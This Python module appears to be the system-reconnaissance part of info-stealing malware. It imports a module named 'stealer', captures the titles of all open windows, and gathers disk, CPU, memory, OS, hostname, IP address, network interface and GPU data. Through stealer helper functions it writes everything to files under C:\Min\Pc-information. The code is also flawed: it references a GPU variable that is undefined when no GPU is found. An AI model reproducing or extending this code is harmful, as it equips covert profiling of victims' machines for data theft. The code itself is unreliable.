import pyautogui
import os
import psutil
import platform
import socket
import cpuinfo
import GPUtil
from datetime import datetime
import stealer

def gather_system():
    p = pyautogui.getAllTitles()

    stealer.write_open_files("C:\\Min\\Pc-information\\openFiles.txt", p)

    ####################Диск################################

    disk_info = psutil.disk_usage('/')

    total_gb = round(disk_info.total / (1024 ** 3), 2)
    used_gb = round(disk_info.used / (1024 ** 3), 2)
    free_gb = round(disk_info.free / (1024 ** 3), 2)

    def get_disk_count():
        partitions = psutil.disk_partitions()
        return len(partitions)

    disk_count = get_disk_count()

    ####################Процессор############################

    cpu_usage = psutil.cpu_percent(interval=1)

    ####################Оперативня память####################

    memory_info = psutil.virtual_memory()

    total_memory = round(memory_info.total / (1024 ** 3), 2)
    used_memory = round(memory_info.used / (1024 ** 3), 2)
    free_memory = round(memory_info.free / (1024 ** 3), 2)

    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    current_directory = os.getcwd()

    ####################Сеть#################################

    host_name = socket.gethostname()
    ip_address = socket.gethostbyname(host_name)

    network_info = {}
    for interface, addrs in psutil.net_if_addrs().items():
        network_info[interface] = [addr.address for addr in addrs]

    ####################Ос###################################
    system_info = {
        "OS": platform.system(),
        "OS Version": platform.version(),
        "OS Release": platform.release(),
        "Architecture": platform.architecture(),
    }

    system_info_str = {key: str(value) for key, value in system_info.items()}


    ####################Gpu#################################

    gpus = GPUtil.getGPUs()

    if len(gpus) == 0:
        print("Видеокарты не найдены.")
    else:
        for i, gpu in enumerate(gpus):
            pass

    ####################Cpu#################################

    info = cpuinfo.get_cpu_info()
    processor_model = info['brand_raw']

    stealer.write_pc_info(
        "C:\\Min\\Pc-information\\pc-info.txt",
        total_gb,  
        used_gb,
        free_gb,
        disk_count,
        psutil.cpu_count(logical=False),
        psutil.cpu_count(logical=True),
        processor_model,
        cpu_usage,
        total_memory,
        used_memory,
        free_memory,
        current_time,
        current_directory,
        str(system_info_str),
        host_name,
        socket.gethostbyname(host_name),
        str(network_info),
        gpu.name,
        gpu.load * 100,
        gpu.temperature,
        gpu.memoryTotal,
        gpu.memoryUsed,
        gpu.memoryFree,
    )